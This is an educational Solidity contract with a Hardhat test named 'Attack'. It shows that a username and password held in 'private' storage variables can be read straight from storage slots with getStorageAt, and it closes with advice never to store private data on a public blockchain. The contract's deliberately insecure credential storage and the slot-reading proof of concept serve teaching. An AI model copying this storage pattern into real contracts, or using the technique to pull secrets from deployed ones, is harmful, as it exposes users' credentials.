// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract LoginDetails {

    // Private variables
    //private variables can only be accessed and modified by the smart contract itself, not even derived contracts. 
    //However, this does not mean that external parties cannot read the value.
    // Each bytes32 variable would occupy one slot
    // because bytes32 variable has 256 bits(32*8)
    // which is the size of one slot

    // Slot 0
    bytes32 private username;
    // Slot 1
    bytes32 private password;

    constructor(bytes32  _username, bytes32  _password) {
        username = _username;
        password = _password;
    }
}

//See by testcase on Hardhat, we can know value of private variables:-

const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Attack", function () {
  it("Should be able to read the private variables password and username", async function () {
    // Deploy the login contract
    const loginFactory = await ethers.getContractFactory("LoginDetails");

    // To save space, we would convert the string to bytes32 array
    const usernameBytes = ethers.utils.formatBytes32String("test");
    const passwordBytes = ethers.utils.formatBytes32String("password");

    const loginContract = await loginFactory.deploy(
      usernameBytes,
      passwordBytes
    );
    // contract is deployed, we use provider.getStorageAt to read storage slot values at loginContract.address for slots 0 and 1 directly,
    await loginContract.deployed();

    // Get the storage at storage slot 0,1
    const slot0Bytes = await ethers.provider.getStorageAt(
      loginContract.address,
      0
    );
    const slot1Bytes = await ethers.provider.getStorageAt(
      loginContract.address,
      1
    );

    // We are able to extract the values of the private variables
    //we can compare the retrieved values - slot0Bytes against usernameBytes and slot1Bytes against passwordBytes to ensure they are, in fact, equal.
    expect(ethers.utils.parseBytes32String(slot0Bytes)).to.equal("test");
    expect(ethers.utils.parseBytes32String(slot1Bytes)).to.equal("password");
  });
});

//Prevention:- NEVER store private information on a public blockchain.
